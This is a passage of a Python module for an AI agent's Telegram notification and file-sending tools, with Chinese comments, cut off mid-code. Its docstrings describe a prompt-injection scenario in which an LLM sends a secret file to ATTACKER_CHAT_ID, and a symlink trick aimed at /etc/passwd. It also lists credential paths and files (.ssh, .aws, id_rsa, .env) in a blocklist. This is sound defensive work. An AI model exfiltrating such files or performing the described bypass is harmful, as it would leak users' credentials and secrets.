"""Telegram bot push notifications + file sending.

Credentials stored in
OS keyring under the shared xiaohong-agent service.
"""
import os
import math
import shutil
import subprocess
import tempfile
import time
import requests

from agent_core.env_utils import env_float as _env_float, env_int as _env_int
from agent_core.gemini_client import _KEYRING_SERVICE
from agent_core.log_redact import redact_log_line
from agent_core.secret_provider import get_secret
from agent_core.telegram_format import markdown_to_telegram_html, telegram_text_chunks

_TELEGRAM_KEYRING_TOKEN = "telegram-bot-token"
_TELEGRAM_KEYRING_CHAT_ID = "telegram-chat-id"
_TELEGRAM_API_BASE = "https://api.telegram.org"
_TELEGRAM_MSG_LIMIT = 4096  # Telegram 單則訊息最大字數
# Bot API 上限（2024 標準）
_TG_DOC_MAX_BYTES = 50 * 1024 * 1024     # sendDocument 50 MB
_TG_PHOTO_MAX_BYTES = 10 * 1024 * 1024   # sendPhoto 10 MB
_TG_CAPTION_MAX = 1024                    # caption 最多 1024 字
_TG_FILE_TIMEOUT = 180                    # 上傳大檔給 180 秒
_TG_SPLIT_SAFETY_MARGIN_BYTES = 512 * 1024
_TG_VIDEO_SPLIT_EXTS = frozenset({".mp4", ".m4v", ".mov", ".mkv", ".webm"})


_TG_SPLIT_TARGET_BYTES = _env_int("RED_TG_SPLIT_TARGET_BYTES", 20 * 1024 * 1024, min_value=1)
_TG_UPLOAD_RETRIES = _env_int("RED_TG_UPLOAD_RETRIES", 3, min_value=1, max_value=10)
_TG_UPLOAD_RETRY_SLEEP_S = _env_float("RED_TG_UPLOAD_RETRY_SLEEP_S", 2.0, min_value=0.0, max_value=60.0)
_TG_MAX_SPLIT_PARTS = _env_int("RED_TG_MAX_SPLIT_PARTS", 128, min_value=2, max_value=1000)


def _telegram_secret_setting(env_name: str, default: str) -> str:
    return (os.environ.get(env_name) or default).strip() or default


def _get_telegram_token() -> str:
    secret_name = _telegram_secret_setting(
        "RED_TELEGRAM_BOT_TOKEN_SECRET_NAME",
        _TELEGRAM_KEYRING_TOKEN,
    )
    keyring_name = _telegram_secret_setting(
        "RED_TELEGRAM_BOT_TOKEN_KEYRING_NAME",
        secret_name,
    )
    return get_secret(
        secret_name,
        env_names=("TELEGRAM_BOT_TOKEN", "RED_TELEGRAM_BOT_TOKEN"),
        keyring_service=_KEYRING_SERVICE,
        keyring_name=keyring_name,
    ).value


def _get_agent_bot_token(color: str) -> str:
    """部門色專屬 bot token（keyring 慣例 `<color>-telegram-bot-token`）。

    給 telegram_push_agent 用：部門推播優先從**該部門自己的 bot** 發（員工多半
    只 /start 過部門 bot、沒 start 過主 bot —— 主 token 發過去會 403 Forbidden）。
    red / 空色 / keyring 沒該色 token → 回空字串，呼叫端退回預設主 bot token。
    """
    normalized = str(color or "").strip().lower()
    if not normalized or normalized == "red":
        return ""
    name = f"{normalized}-telegram-bot-token"
    try:
        return get_secret(
            name,
            env_names=(),
            keyring_service=_KEYRING_SERVICE,
            keyring_name=name,
        ).value or ""
    except Exception:
        return ""


def _bot_token_for_target(target: str) -> str:
    """目標 chat 綁了部門色且該色 bot 可觸達 → 回該色 bot token；否則空=主 bot。

    讓 telegram_push / telegram_send_file / telegram_send_photo「傳給某員工」
    自動由其部門 bot 發話（員工可能只 /start 過部門 bot、甚至封鎖主 bot —— 主
    token 發過去 403）。流程：telegram_agent_config 查綁定色 → keyring 色 token
    → sendChatAction 探測（200 才用；403=對方沒 start 過該色 bot，回空照走主
    bot）。探測是一次廉價 API 呼叫，換掉「大檔上傳失敗才換 bot 重傳」的浪費。
    任一步失敗一律 fail-open 回主 bot —— 授權閘在 _resolve_chat_id，這裡只決定
    「由哪個 bot 說話」。
    """
    chat_id = str(target or "").strip()
    if not chat_id:
        return ""
    try:
        from agent_core.telegram_agent_config import actor_for_chat_id
        color = str(actor_for_chat_id(chat_id).get("color") or "").strip().lower()
    except Exception:
        return ""
    token = _get_agent_bot_token(color)
    if not token:
        return ""
    try:
        _result, err = _telegram_call(
            "sendChatAction",
            {"chat_id": chat_id, "action": "typing"},
            timeout=10,
            token=token,
        )
        return "" if err else token
    except Exception:
        return ""


def _get_telegram_chat_id() -> str:
    secret_name = _telegram_secret_setting(
        "RED_TELEGRAM_CHAT_ID_SECRET_NAME",
        _TELEGRAM_KEYRING_CHAT_ID,
    )
    keyring_name = _telegram_secret_setting(
        "RED_TELEGRAM_CHAT_ID_KEYRING_NAME",
        secret_name,
    )
    return get_secret(
        secret_name,
        env_names=("TELEGRAM_CHAT_ID", "RED_TELEGRAM_CHAT_ID"),
        keyring_service=_KEYRING_SERVICE,
        keyring_name=keyring_name,
    ).value


def _authorized_chat_ids() -> set[str]:
    """回傳所有授權可接收訊息的 chat_id 集合。

    來源：keyring 裡的大王 chat_id ＋ env `RED_AUTHORIZED_CHAT_IDS=id1,id2`
    （逗號分隔；值設在 launchd plist，改完要 redeploy telegram daemon）。
    """
    authorized = set()
    keyring_id = _get_telegram_chat_id()
    if keyring_id:
        authorized.add(keyring_id)
    env_extra = os.environ.get("RED_AUTHORIZED_CHAT_IDS", "")
    for cid in env_extra.split(","):
        cid = cid.strip()
        if cid:
            authorized.add(cid)
    return authorized


def _resolve_chat_id(requested: str = "") -> tuple[str, str]:
    """🛡️ chat_id 授權檢查（critical security gate）。

    防攻擊：LLM 被 prompt-injection 後可能呼叫
       telegram_send_file(secret, chat_id=ATTACKER_CHAT_ID)
    把機密檔送到攻擊者 Telegram。

    這函式強制：requested chat_id 必須在 _authorized_chat_ids() 集合內，
    否則拒（且不洩漏「真實 chat_id 是什麼」）。

    Args:
        requested: caller 提供的 chat_id；空字串 = 用 keyring 預設

    Returns:
        (resolved_chat_id, error_msg)。error_msg 非空表示拒絕。
    """
    authorized = _authorized_chat_ids()
    if not authorized:
        return "", "未設定 Telegram chat_id（請跑 telegram_setup.py）"
    requested = (requested or "").strip()
    if not requested:
        # caller 沒指定 → 用 keyring 預設（最常見路徑）
        return _get_telegram_chat_id(), ""
    if requested not in authorized:
        # 拒絕未授權 chat_id — 不要在錯誤訊息裡 echo requested 值
        # （怕 LLM 試錯時記住一堆 chat_id）
        return "", (
            "chat_id 未授權傳送（防 prompt-injection 把機密寄到攻擊者）。\n"
            "   只能傳到 keyring 設定的大王 chat_id。\n"
            "   要加入額外授權：env RED_AUTHORIZED_CHAT_IDS=id1,id2"
        )
    return requested, ""


def _parse_telegram_response(response):
    try:
        data = response.json()
    except ValueError:
        body = (getattr(response, "text", "") or "").strip()[:200]
        status = getattr(response, "status_code", "?")
        reason = getattr(response, "reason", "") or "empty response"
        detail = body or reason
        return None, f"Telegram API 回應格式錯誤：HTTP {status} 非 JSON：{detail}"
    if not isinstance(data, dict):
        return None, f"Telegram API 回應格式錯誤：預期 object，收到 {type(data).__name__}"
    if not data.get("ok"):
        status = getattr(response, "status_code", "")
        status_text = f"HTTP {status}: " if status else ""
        description = data.get("description", getattr(response, "text", ""))
        return None, f"Telegram API 錯誤：{status_text}{str(description)[:200]}"
    return data, None


def _telegram_call(method: str, payload: dict = None, timeout: int = 10,
                   token: str | None = None):
    token = token or _get_telegram_token()
    if not token:
        return None, "未設定 Telegram token（請跑 telegram_setup.py）"
    try:
        r = requests.post(
            f"{_TELEGRAM_API_BASE}/bot{token}/{method}",
            json=payload or {},
            timeout=timeout,
        )
        data, err = _parse_telegram_response(r)
        if err:
            return None, err
        return data.get("result"), None
    except Exception as e:
        # 例外訊息含 .../bot<TOKEN>/method 的 URL — redact 掉 bot token 再回傳。
        return None, f"Telegram 呼叫失敗：{type(e).__name__}: {redact_log_line(str(e))}"


def _telegram_text_chunks(message: str) -> list[str]:
    """切分推播訊息（共用 telegram_format.telegram_text_chunks）。

    以 UTF-16 code unit 計長（Telegram 的 4096 算法；emoji 佔 2），且多段時每段
    預留 `[i/n]\\n` 前綴空間 —— 之前用 code point 切滿 4096，加上前綴就爆上限、
    整段被 Telegram 打回。
    """
    return telegram_text_chunks((message or "").strip(), limit=_TELEGRAM_MSG_LIMIT)


def _send_message_with_retries(target: str, text: str, *, timeout: int = 10,
                               html_text: str | None = None,
                               token: str | None = None):
    """sendMessage with bounded retries for transient Telegram errors.

    對「外送文字」做跟 _send_photo_with_retries / _send_document_part_with_retries
    同級的重試 —— 之前文字推播（telegram_push：每日生產回報、告警、briefing）一遇
    `HTTP 502: Bad Gateway` 就**靜默失敗、無人值守也沒人會發現**。可重試判斷共用
    _TG_RETRYABLE_TOKENS（含 5xx 閘道錯誤）；永久錯誤（chat not found 等）只試一次。

    注意：互動「回覆」走的是 daemon_telegram.tg_send，它本來就有 5xx/429 重試；這裡
    補的是 agent_core.telegram 這條**推播**路徑（先前完全沒重試）。回傳 (result, err)。

    html_text：呼叫端（_send_text_to_resolved_chat）對「單段且含 ``` 圍欄」的訊息渲染
    好的 Telegram HTML（<pre> 等寬，讓欄位對齊）。給了就優先以 parse_mode=HTML 送；若
    Telegram 永久性拒絕（最常見＝400 bad entities，非暫時性 5xx/限流）就自動退回純文字
    text 重送一次（安全網——對齊只加分、永不把訊息弄丟）。不給（html_text=None）時 payload
    與先前**完全相同**＝對不含圍欄的訊息零行為改變。比照 daemon_telegram.tg_send。
    """
    attempts = max(1, _TG_UPLOAD_RETRIES)
    last_err: str | None = None
    for attempt in range(1, attempts + 1):
        payload = {
            "chat_id": target,
            "text": html_text if html_text is not None else text,
            "disable_web_page_preview": True,
        }
        if html_text is not None:
            payload["parse_mode"] = "HTML"
        result, err = _telegram_call("sendMessage", payload, timeout=timeout,
                                     token=token)
        if not err:
            return result, None
        # HTML 渲染被永久性拒絕（多半是 400 bad entities）→ 退回純文字當下重送一次。
        # 只在「永久」錯誤退回（暫時性 5xx/限流的 HTML 是有效的，留給下面的重試），
        # 避免在短暫故障時對同一則訊息重送純文字版（雙送風險）。
        if html_text is not None and not _telegram_upload_error_retryable(err):
            html_text = None  # 此後一律純文字
            result, err = _telegram_call("sendMessage", {
                "chat_id": target,
                "text": text,
                "disable_web_page_preview": True,
            }, timeout=timeout, token=token)
            if not err:
                return result, None
        last_err = err
        if attempt >= attempts or not _telegram_upload_error_retryable(err):
            break
        time.sleep(min(_TG_UPLOAD_RETRY_SLEEP_S * attempt, 10))
    if attempts > 1 and last_err and _telegram_upload_error_retryable(last_err):
        last_err = f"{last_err}（已重試 {attempts} 次）"
    return None, last_err


def _send_text_to_resolved_chat(message: str, target: str, *,
                                token: str | None = None) -> tuple[int, int, str]:
    chunks = _telegram_text_chunks(message)
    single = len(chunks) == 1
    # 單段且含 ``` 圍欄 → 渲染成 Telegram HTML（<pre> 等寬，讓庫存表/生產回報等欄位對齊）。
    # 跨段（>4096）會把 <pre> 切壞，故僅單段啟用（同 daemon_telegram.tg_send）。
    html_text: str | None = None
    if single and "```" in chunks[0]:
        rendered, pm = markdown_to_telegram_html(chunks[0])
        if pm:
            html_text = rendered
    ok_count = 0
    last_err = ""
    for i, chunk in enumerate(chunks, 1):
        text = chunk if single else f"[{i}/{len(chunks)}]\n{chunk}"
        _result, err = _send_message_with_retries(target, text, html_text=html_text,
                                                  token=token)
        if err:
            last_err = err
        else:
            ok_count += 1
    return ok_count, len(chunks), last_err


def telegram_push(message: str, chat_id: str = ""):
    """把一則訊息推到大王的 Telegram。
    - message: 要發送的文字內容（支援純文字；超過 4096 字會自動分段）。
    - chat_id: 可省略，留空就用 keyring 裡存的大王 chat_id。
               只能是已授權的 chat_id（_authorized_chat_ids()），防 prompt-injection
               把訊息寄到攻擊者 Telegram。
    這是最常用的「主動通知大王」管道，比 Gmail 即時；手機外出也看得到。"""
    if not (message or "").strip():
        return "錯誤：message 不能空。"
    target, err = _resolve_chat_id(chat_id)
    if err:
        return f"錯誤：{err}"
    # 目標綁部門色且該色 bot 可觸達 → 由部門 bot 發（員工可能封鎖主 bot）。
    token = _bot_token_for_target(target) or None
    ok_count, total, last_err = _send_text_to_resolved_chat(message, target,
                                                           token=token)
    via = "（經部門 bot）" if token else ""
    if ok_count == total:
        return f"✅ 已推送到 Telegram（共 {total} 段）{via}"
    return f"部分失敗：{ok_count}/{total} 成功。最後錯誤：{last_err}"


def telegram_push_agent(
    agent_color: str,
    message: str,
    *,
    fallback_to_owner: bool = True,
):
    """Push a message to the Telegram chat(s) configured for one agent color.

    Unlike telegram_push(chat_id=...), the destination is resolved only from
    trusted local config (employee registry / RED_TELEGRAM_AGENT_CHATS). That
    keeps prompt-injection from choosing arbitrary chat IDs while still giving
    department agents their own outbound notification channel.
    """
    if not (message or "").strip():
        return "錯誤：message 不能空。"
    color = str(agent_color or "").strip().lower()
    if not color:
        return "錯誤：agent_color 不能空。"
    targets, fallback_note, target_err = _agent_push_targets(
        color, fallback_to_owner=fallback_to_owner)
    if target_err:
        return target_err

    # 部門推播優先走該色自己的 bot（keyring `<color>-telegram-bot-token`）：
    # 員工多半只 /start 過部門 bot、沒 start 過主 bot（甚至封鎖主 bot），
    # 用主 token 發會 403 Forbidden。沒有該色 token → color_token=""，照舊主 bot。
    color_token = _get_agent_bot_token(color)

    ok_total = 0
    segment_total = 0
    failures: list[str] = []
    for target in targets:
        ok_count, total, last_err = _send_text_to_resolved_chat(
            message, target, token=color_token or None)
        # 色 bot 全滅且為永久錯誤（403 blocked / chat not found = 對方沒 start
        # 過色 bot）→ 換主 bot token 對同一 chat 重試一次。只在 0 段成功時換手，
        # 避免部分段已送出又用另一個 bot 重送造成雙訊息。
        if (color_token and ok_count == 0 and last_err
                and not _telegram_upload_error_retryable(last_err)):
            ok_count, total, last_err = _send_text_to_resolved_chat(message, target)
            if ok_count == total:
                fallback_note += f"（{target} 改由主 bot 送達）"
        ok_total += ok_count
        segment_total += total
        if ok_count != total:
            failures.append(f"{target}: {last_err}")
    if not failures:
        via = f"（經 {color} bot）" if color_token else ""
        return (
            f"✅ 已推送到 {color} Telegram"
            f"（{len(targets)} chat，共 {segment_total} 段）{via}{fallback_note}"
        )
    return (
        f"部分失敗：{ok_total}/{segment_total} 段成功；"
        f"{len(failures)} chat 失敗。最後錯誤：{failures[-1]}"
    )


def _agent_push_targets(color: str, *, fallback_to_owner: bool) -> tuple[list, str, str]:
    """解析某部門色的推播收件 chat。回 (targets, fallback_note, error)。

    收件人**只從本地可信設定**來（員工 registry / RED_TELEGRAM_AGENT_CHATS），
    不吃呼叫端傳進來的 chat_id —— 這是 telegram_push_agent 系列跟
    telegram_push/telegram_send_photo 最大的差別：後者收 chat_id 參數，所以要
    _resolve_chat_id 的 RED_AUTHORIZED_CHAT_IDS 白名單擋 prompt-injection 挑
    任意 chat；這裡的目的地無法被 prompt 影響，白名單就不是必要的閘。
    """
    owner_chat_id = _get_telegram_chat_id()
    try:
        from agent_core.telegram_agent_config import chat_ids_for_agent
        targets = sorted(chat_ids_for_agent(color, owner_chat_id=owner_chat_id))
    except Exception as exc:
        return [], "", f"錯誤：讀取 {color} Telegram 設定失敗：{type(exc).__name__}: {exc}"
    fallback_note = ""
    if not targets and fallback_to_owner and owner_chat_id:
        targets = [owner_chat_id]
        fallback_note = f"（{color} 未設定專屬 chat，已 fallback 到 Red owner）"
    if not targets:
        return [], "", f"錯誤：{color} 尚未設定 Telegram chat_id。"
    return targets, fallback_note, ""


def telegram_send_photo_agent(
    agent_color: str,
    file_path: str,
    caption: str = "",
    *,
    fallback_to_owner: bool = True,
):
    """把一張圖推給某部門色設定的 Telegram chat（telegram_push_agent 的圖片版）。

    為什麼要有這顆（2026-08-04 UserC 案）：要把修好的成品鞋圖傳給 UserC 時發現
    **文字推得出去、圖片推不出去** —— `telegram_push_agent` 從 registry 解析收件
    人，而 `telegram_send_photo` 走 `_resolve_chat_id`，只認
    `RED_AUTHORIZED_CHAT_IDS`，各色 plist 根本沒設這個鍵。等於部門推播的圖片端
    是半殘的（同 #342 UserJ/UserL 收不到主動推播的病，只是犯在附件端、十色都中）。
    正解是補這條對稱路徑，而不是把每個員工 chat 硬編進十份 plist（registry 改了
    還要記得同步兩處，遲早漂移）。

    ⚠️ 刻意**不進工具目錄**（跟 telegram_push_agent 一樣只給 daemon / 部門程式
    呼叫）：部門白名單是唯一閘門、不過 policy_engine，把「能對員工發任意檔案」
    這種能力放進去等於無閘授權。

    Args:
        agent_color: 部門色（green/yellow/…）。收件 chat 只從本地可信設定解析。
        file_path: 圖片路徑（jpg/png/gif/webp/bmp，10MB 內；超過改用 email 或
            telegram_send_file）。
        caption: 圖說（最多 1024 字，會過 log_redact）。
        fallback_to_owner: 該色沒設 chat 時退回大王 chat（預設 True，同文字版）。

    Returns:
        字串。全成功開頭是 "✅"，呼叫端照 telegram_push_agent 的慣例判斷。
    """
    color = str(agent_color or "").strip().lower()
    if not color:
        return "錯誤：agent_color 不能空。"
    abs_path, val_err, suggested_fix = _validate_photo_for_send(file_path)
    if val_err:
        return f"錯誤：{val_err}" + (f"（{suggested_fix}）" if suggested_fix else "")
    targets, fallback_note, target_err = _agent_push_targets(
        color, fallback_to_owner=fallback_to_owner)
    if target_err:
        return target_err

    caption = (caption or "")[:_TG_CAPTION_MAX]
    try:
        from agent_core.log_redact import redact_log_line
        caption = redact_log_line(caption)
    except Exception:  # noqa: BLE001
        pass

    # 同 telegram_push_agent：優先用該色自己的 bot（員工多半只 /start 過部門 bot），
    # 永久錯誤（403 blocked / chat not found）才換主 bot 對同一 chat 重試一次。
    color_token = _get_agent_bot_token(color)
    filename = os.path.basename(abs_path)
    ok_count = 0
    failures: list[str] = []
    for target in targets:
        try:
            _result, err = _send_photo_with_retries(
                target=target, abs_path=abs_path, filename=filename,
                caption=caption, token=color_token or None)
            if err and color_token and not _telegram_upload_error_retryable(err):
                _result, err = _send_photo_with_retries(
                    target=target, abs_path=abs_path, filename=filename,
                    caption=caption)
                if not err:
                    fallback_note += f"（{target} 改由主 bot 送達）"
        except Exception as exc:  # noqa: BLE001 — 開檔/網路例外不該炸掉呼叫端
            err = f"{type(exc).__name__}: {exc}"
        if err:
            failures.append(f"{target}: {err}")
        else:
            ok_count += 1
    if not failures:
        via = f"（經 {color} bot）" if color_token else ""
        return (f"✅ 已傳送圖片 {filename} 到 {color} Telegram"
                f"（{len(targets)} chat）{via}{fallback_note}")
    return (f"部分失敗：{ok_count}/{len(targets)} chat 成功。"
            f"最後錯誤：{failures[-1]}")


# ────────────────────────────────────────────────────────────────────
# File sending — sendDocument / sendPhoto
# ────────────────────────────────────────────────────────────────────
# 安全考量：
#   1. 用 path_safety.safe_path 解析路徑（擋 traversal / 系統檔）
#   2. 額外擋 /etc/, /private/etc/, ~/.ssh/, /var/log/ 等敏感區
#   3. 檔案大小檢查（>單檔上限走分卷；影片優先切成可播放片段）
#   4. caption 截至 1024 字（Telegram API 上限）
#   5. CONFIRM tier — LLM 寄檔案是有副作用的，要 +確認
#
# 為什麼不用 sendMessage 帶 URL：URL 過期 / Drive 權限 / Telegram 預覽
# 不見得能放，直接 multipart 上傳檔案最穩。

# 圖片副檔名（走 sendPhoto，inline 顯示縮圖）
_TG_PHOTO_EXTS = frozenset({".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp"})

# 敏感路徑黑名單（含子字串比對 — 路徑含這些就拒）
_TG_FORBIDDEN_SUBSTRINGS = (
    # 系統路徑
    "/etc/", "/private/etc/", "/var/log/", "/var/db/",
    "/private/var/log/", "/private/var/db/",
    # 使用者敏感資料夾
    "/.ssh/", "/.aws/", "/.gnupg/", "/.config/gh/",
    "/library/keychains/",
    # RED 內部 state（含 vault access log / token / 憑證）
    "/var/state/",
)
# 危險檔名（無論在哪都不傳）
_TG_FORBIDDEN_BASENAMES = (
    "credentials.json", "token.json", ".env",
    "vault.json", "vaults.json", "secrets.json",
    "id_rsa", "id_ed25519", "id_dsa", "id_ecdsa",
)


def _validate_photo_for_send(file_path: str) -> tuple[str, str, str]:
    """sendPhoto 前的共用檢查（路徑白名單 → 副檔名 → 10MB 上限）。

    回 `(abs_path, "", "")`；不合格回 `("", 錯誤訊息, 建議修法)`。
    `telegram_send_photo`（LLM 工具、回 ToolResult）與 `telegram_send_photo_agent`
    （內部推播、回字串）共用這一份 —— 兩邊各抄一份必然漂移（改了 10MB 上限只改
    到一邊，另一邊還在用舊值卻沒人發現）。三種失敗在呼叫端都是 INVALID_INPUT。
    """
    ok, err_or_path = _validate_send_path(file_path)
    if not ok:
        return "", err_or_path, ""
    abs_path = err_or_path
    ext = os.path.splitext(abs_path)[1].lower()
    if ext not in _TG_PHOTO_EXTS:
        return "", (f"副檔名 {ext} 不是支援的圖片"
                    f"（{', '.join(sorted(_TG_PHOTO_EXTS))}）"), "非圖片用 telegram_send_file 傳"
    size = os.path.getsize(abs_path)
    if size > _TG_PHOTO_MAX_BYTES:
        return "", (f"圖片 {size / 1024 / 1024:.1f}MB 超過 Telegram sendPhoto 10MB 上限"
                    ), "改用 telegram_send_file（支援到 50MB 但無 inline 預覽）"
    return abs_path, "", ""


def _validate_send_path(file_path: str) -> tuple[bool, str]:
    """檔案安全檢查 — 回 (ok, real_path 或 error_msg)。

    跟 path_safety.safe_path 不同：safe_path 是寫入保護（var/data 都擋），
    這裡是讀取＋外送 — 大部分目錄該允許讀，只擋系統 / 認證類目錄。

    驗證：
      1. realpath（**解析 symlink** — 防 /tmp/innocent.txt → /etc/passwd 繞過 blocklist）
      2. 不能在敏感子字串清單（/etc/, .ssh/, var/state/ 等）
      3. 檔名不能在敏感清單（credentials.json, id_rsa 等）
      4. 檔案必須存在 + 是 regular file
      5. 必須在允許的根目錄底下（REPO_ROOT / RUNTIME_ROOT / /tmp / ~/Downloads）

    安全：用 realpath 而不是 abspath 是 critical fix — abspath 不會跟著
    symlink，攻擊者可建 /tmp/innocent.txt → /etc/passwd 繞過所有 blocklist。
    realpath 會解析 symlink，blocklist 會看到真實的 /etc/passwd 並擋下。
    """
    if not file_path or not isinstance(file_path, str):
        return False, "file_path 必填且須為字串"
    try:
        # realpath 解析 symlink；先 expanduser 處理 ~
        # 防 symlink attack：/tmp/innocent.txt → /etc/passwd
        abs_path = os.path.realpath(os.path.expanduser(file_path))
    except Exception as e:
        return False, f"路徑解析失敗：{e}"
    lowered = abs_path.lower()

    # 1. sensitive substring（最先擋，包含 traversal 後落到 /etc/）
    for pat in _TG_FORBIDDEN_SUBSTRINGS:
        if pat in lowered:
            return False, f"禁止傳送敏感路徑：{abs_path}"

    # 2. sensitive basename
    base_lower = os.path.basename(abs_path).lower()
    for pat in _TG_FORBIDDEN_BASENAMES:
        if pat in base_lower:
            return False, f"禁止傳送敏感檔名：{os.path.basename(abs_path)}"

    # 3. allowed roots — 限縮到 repo / 執行階段 / 暫存 / Downloads
    try:
        from agent_core.logging_and_paths import REPO_ROOT, RUNTIME_ROOT
    except Exception:
        REPO_ROOT = "/Users/user/RED"
        RUNTIME_ROOT = REPO_ROOT + "/var"
    # 系統暫存目錄（macOS = /var/folders/.../T/，Linux = /tmp）
    # realpath 處理 macOS 的 /var → /private/var symlink，跟 abs_path 同基準才比得到
    import tempfile as _tempfile
    sys_tmp = os.path.realpath(_tempfile.gettempdir())
    allowed_roots = [
        os.path.realpath(REPO_ROOT),
        os.path.realpath(RUNTIME_ROOT),
        os.path.realpath("/tmp"),
        sys_tmp,
        os.path.realpath(os.path.expanduser("~/Downloads")),
    ]
    if not any(abs_path == r or abs_path.startswith(r + os.sep)
               for r in allowed_roots):
        return False, (
            f"檔案不在允許的根目錄。允許：{', '.join(allowed_roots[:3])} ...\n"
            f"   實際：{abs_path}"
        )

    # 4. file existence
    if not os.path.isfile(abs_path):
        return False, f"找不到檔案：{abs_path}"

    return True, abs_path


def _telegram_call_multipart(method: str, files: dict, data: dict,
                              timeout: int = _TG_FILE_TIMEOUT,
                              token: str | None = None):
    """用 multipart/form-data 呼叫 Bot API（檔案上傳專用）。"""
    token = token or _get_telegram_token()
    if not token:
        return None, "未設定 Telegram token（請跑 telegram_setup.py）"
    try:
        r = requests.post(
            f"{_TELEGRAM_API_BASE}/bot{token}/{method}",
            files=files, data=data, timeout=timeout,
        )
        resp, err = _parse_telegram_response(r)
        if err:
            return None, err
        return resp.get("result"), None
    except requests.exceptions.Timeout:
        return None, f"上傳超時（>{timeout}s）— 檔案太大或網路慢"
    except Exception as e:
        return None, f"Telegram 上傳失敗：{type(e).__name__}: {redact_log_line(str(e))}"


def _telegram_upload_timeout(size_bytes: int) -> int:
    """Use a larger write timeout for bigger multipart uploads."""
    # 256KB/s floor: slow enough for flaky mobile/Wi-Fi, capped to avoid hangs.
    return max(_TG_FILE_TIMEOUT, min(600, int(size_bytes / (256 * 1024)) + 60))


# 暫時性上傳錯誤關鍵字 —— 命中就重試（vs. chat not found / bad request 這類永久錯誤）。
# 含 Telegram 偶發的 5xx 閘道錯誤（502/503/504）：2026-06-16 一次 `HTTP 502: Bad Gateway`
# 讓整張甘特圖永久漏掉、小紅退而求其次做成 Excel 表格，正是因為這類錯誤當時不算「可重試」
# 而 sendPhoto 又完全沒重試。getUpdates 收訊同一時間也 502，可證是 Telegram 端短暫故障。
_TG_RETRYABLE_TOKENS = (
    "timeout",
    "timed out",
    "connection",
    "連線",
    "超時",
    "aborted",
    "reset",
    "temporarily",
    "too many requests",
    "retry",
    # Telegram 暫時性 5xx 閘道錯誤
    "502",
    "503",
    "504",
    "bad gateway",
    "gateway time",
    "service unavailable",
)


def _telegram_upload_error_retryable(error: str) -> bool:
    if not error:
        return False
    lowered = error.lower()
    # 結構化 API 拒絕（"Telegram API 錯誤：..."）多半是永久性的（chat not found /
    # bad request 等），除非帶有暫時性關鍵字（timeout / 限流 / 5xx 閘道）才重試。
    if error.startswith("Telegram API 錯誤") and not any(token in lowered for token in _TG_RETRYABLE_TOKENS):
        return False
    return any(token in lowered for token in _TG_RETRYABLE_TOKENS)


def _send_document_part_with_retries(
    *,
    target: str,
    part_path: str,
    part_name: str,
    caption: str,
    token: str | None = None,
):
    """Send one document part with bounded retries for transient upload errors."""
    attempts = max(1, _TG_UPLOAD_RETRIES)
    timeout = _telegram_upload_timeout(os.path.getsize(part_path))
    last_err: str | None = None
    for attempt in range(1, attempts + 1):
        with open(part_path, "rb") as part_file:
            result, err = _telegram_call_multipart(
                "sendDocument",
                files={"document": (part_name, part_file)},
                data={"chat_id": target, "caption": caption},
                timeout=timeout,
                token=token,
            )
        if not err:
            return result, None, attempt
        last_err = err
        if attempt >= attempts or not _telegram_upload_error_retryable(err):
            break
        time.sleep(min(_TG_UPLOAD_RETRY_SLEEP_S * attempt, 10))
    if attempts > 1 and last_err and _telegram_upload_error_retryable(last_err):
        last_err = f"{last_err}（已重試 {attempts} 次）"
    return None, last_err, attempts


def _send_photo_with_retries(*, target: str, abs_path: str, filename: str,
                             caption: str, token: str | None = None):
    """Send one photo via sendPhoto with bounded retries for transient errors.

    sendPhoto 之前完全沒重試（只有 sendDocument 經 _send_document_part_with_retries
    有）—— Telegram 一個瞬間的 502 Bad Gateway 就讓圖片永久失敗。比照 document 版
    補上重試（含 5xx 閘道錯誤，見 _TG_RETRYABLE_TOKENS）。每次嘗試重開檔案，因為
    失敗的 POST 已消耗掉前一個 file handle。回傳 (result, err)。
    """
    attempts = max(1, _TG_UPLOAD_RETRIES)
    timeout = _telegram_upload_timeout(os.path.getsize(abs_path))
    last_err: str | None = None
    for attempt in range(1, attempts + 1):
        with open(abs_path, "rb") as photo_file:
            result, err = _telegram_call_multipart(
                "sendPhoto",
                files={"photo": (filename, photo_file)},
                data={"chat_id": target, "caption": caption},
                timeout=timeout,
                token=token,
            )
        if not err:
            return result, None
        last_err = err
        if attempt >= attempts or not _telegram_upload_error_retryable(err):
            break
        time.sleep(min(_TG_UPLOAD_RETRY_SLEEP_S * attempt, 10))
    if attempts > 1 and last_err and _telegram_upload_error_retryable(last_err):
        last_err = f"{last_err}（已重試 {attempts} 次）"
    return None, last_err


def _telegram_split_part_size() -> int:
    """Return a safe payload size for split document parts."""
    if _TG_DOC_MAX_BYTES <= _TG_SPLIT_SAFETY_MARGIN_BYTES * 2:
        return max(1, _TG_DOC_MAX_BYTES)
    safe_max = _TG_DOC_MAX_BYTES - _TG_SPLIT_SAFETY_MARGIN_BYTES
    return max(1, min(_TG_SPLIT_TARGET_BYTES, safe_max))


def _probe_media_duration_seconds(path: str) -> float:
    ffprobe = shutil.which("ffprobe")
    if not ffprobe:
        return 0.0
    try:
        proc = subprocess.run(
            [
                ffprobe,
                "-v",
                "error",
                "-show_entries",
                "format=duration",
                "-of",
                "default=noprint_wrappers=1:nokey=1",
                path,
            ],
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=30,
            check=False,
        )
        if proc.returncode != 0:
            return 0.0
        return max(0.0, float((proc.stdout or "0").strip() or "0"))
    except Exception:
        return 0.0


def _try_split_video_for_telegram(
    *,
    abs_path: str,
    filename: str,
    size: int,
    split_dir: str,
) -> list[tuple[str, str]]:
    """Best-effort split into playable video segments under Telegram limit."""
    ext = os.path.splitext(filename)[1].lower()
    if ext not in _TG_VIDEO_SPLIT_EXTS:
        return []
    ffmpeg = shutil.which("ffmpeg")
    duration = _probe_media_duration_seconds(abs_path)
    if not ffmpeg or duration <= 0:
        return []

    target = _telegram_split_part_size()
    stem, ext = os.path.splitext(filename)
    ratio = max(0.01, min(0.95, target / max(1, size)))
    for attempt, safety in enumerate((0.80, 0.60, 0.45, 0.30), start=1):
        attempt_dir = os.path.join(split_dir, f"video_attempt_{attempt}")
        os.makedirs(attempt_dir, exist_ok=True)
        segment_time = max(1.0, duration * ratio * safety)
        if segment_time >= duration:
            segment_time = max(1.0, duration / 2.0)
        pattern = os.path.join(attempt_dir, f"{stem}.part%03d{ext}")
        try:
            proc = subprocess.run(
                [
                    ffmpeg,
                    "-hide_banner",
                    "-loglevel",
                    "error",
                    "-y",
                    "-i",
                    abs_path,
                    "-map",
                    "0",
                    "-c",
                    "copy",
                    "-f",
